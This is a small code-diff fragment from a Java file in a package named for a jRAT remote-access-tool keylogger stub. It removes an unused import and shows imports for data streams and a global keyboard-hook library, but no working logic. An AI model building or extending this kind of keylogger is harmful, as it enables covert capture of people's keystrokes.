@@ -2,7 +2,6 @@ package pro.jrat.stub.keylogger;
 
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
-import java.util.Random;
 
 import org.jnativehook.GlobalScreen;
 
